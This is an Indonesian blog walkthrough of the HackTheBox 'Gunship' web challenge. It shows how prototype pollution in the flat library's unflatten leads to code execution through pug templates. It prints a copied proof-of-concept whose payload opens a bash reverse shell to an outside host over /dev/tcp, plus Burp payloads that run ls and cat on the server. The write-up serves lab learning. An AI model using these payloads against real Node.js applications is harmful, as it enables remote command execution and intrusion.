---
title: "HackTheBox - Gunship"
date: 2023-12-29 07:18:00 +0700
categories: [HackTheBox, Challenges]
tags: [very easy, web]
---

**Gunship** ialah salah satu tantangan kategori web dari situs HackTheBox, Gunship ini sebenarnya tantangan lama tapi karena saya belum coba, jadi saya kerjakan aja. Ini perjalanan/panduan saya. Oh iya, disini kita akan mempelajari tentang exploit, burpsuite dll.

## Introduction

- Munculkan mesin, hahaha....
- Dan download file-nya

## Enumeration

Pertama-tama kita buka webnya dulu, dan analisis. Lihat dibagian bawah web, kita bisa inputkan sesuatu disitu. **"Who's your favourite artist?"**. Untuk menjawabnya, baca dulu bacaan dibagian atas. Jika kita input asal-asalan akan muncul teks **"Please provide us with the full name of an existing member."**.

Setelah baca yang diatas, terdapat dua nama, yaitu **Dan Haigh and Alex Westaway**. Nah, coba salah satu. Dan hasilnya **Hello guest, thank you for letting us know!**.

Hummm. Coba kita analisis file yang sudah didownload tadi. Nah setelah di ekstrak didalamnya ada banyak file, buka yang folder challenge. Di dalam direktori challenge kan ada flag, gak mungkin lah yaa menemukan flag semudah itu, coba baca flagnya **HTB{f4k3_fl4g_f0r_t3st1ng}**, sudah saya bilang `:)` bruhhhhh, coba analisis yang lain dahh. Nah ada yang menarik di bagian `package.json`.

```
{
	"name": "gunship",
	"version": "1.0.0",
	"description": "",
	"main": "index.js",
	"scripts": {
		"start": "node index.js",
		"dev": "nodemon .",
		"test": "echo \"Error: no test specified\" && exit 1"
	},
	"keywords": [],
	"authors": [
		"makelaris",
		"makelarisjr"
	],
	"dependencies": {
		"express": "^4.17.1",
		"flat": "5.0.0",
		"pug": "^3.0.0"
	}
}
```
{: file='package.json'}

Dibagian depedencies ada flat dan pug, hummm. Coba cari digoogle exploitnya, setelah saya cari kalau kerentanan dari flat itu kita bisa `prototype pollution` dan pug itu kita bisa `mengeksekusi kode`. Coba telusuri dan analisis file lainnya, masuk direktori routes baca index.js

```
const path              = require('path');
const express           = require('express');
const pug        		= require('pug');
const { unflatten }     = require('flat');
const router            = express.Router();

router.get('/', (req, res) => {
    return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/submit', (req, res) => {
    const { artist } = unflatten(req.body);

	if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
		return res.json({
			'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
		});
	} else {
		return res.json({
			'response': 'Please provide us with the full name of an existing member.'
		});
	}
});

module.exports = router;
```
{: file='routes/index.js'}

Humm, lihat dibagian router post, ada `unflatten` dan `pug.compile`. Coba cari digoogle lagi `:)`, untuk `pug.compile` tidak ada yang menarik, tapi untuk yang `unflatten` ini menarik, coba search `unflatten exploit` buka yang [hacktricks](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution), nah disitu ada bagian pug, analisis itu. Kita bisa copy dari bagian awal protoblock sampai selesai akhir protoblock.

```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
    }
})

# execute
requests.get(TARGET_URL)
```
```python
"__proto__.block": {
    "type": "Text", 
    "line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
```

Sekarang buka burpsuite, jalan kan yang bagian input-an tadi, masukkan ke repeater burp. Nah di dalam bagian `execSync()` kita ubah jadi `'$(ls)'`, kita akan menampilkan filenya apa aja yang ada di situ. 

![Desktop View](/assets/img/hackthebox/challenges/include/Gunship-1.png){: .w-75}

Lihat hasilnya `/bin/sh: flagkmBDk: not found`, nah sekarang coba kita ganti `'$(cat flagkmBDk)'`

![Desktop View](/assets/img/hackthebox/challenges/include/Gunship-2.png){: .w-75}

*/bin/sh: HTB{f4k3_fl4g_f0r_t3st1ng}*

> kenapa kok fake flag? karena saya menjalankan yang file Docker, bukan yang dari HTB nya langsung.
{: .prompt-info}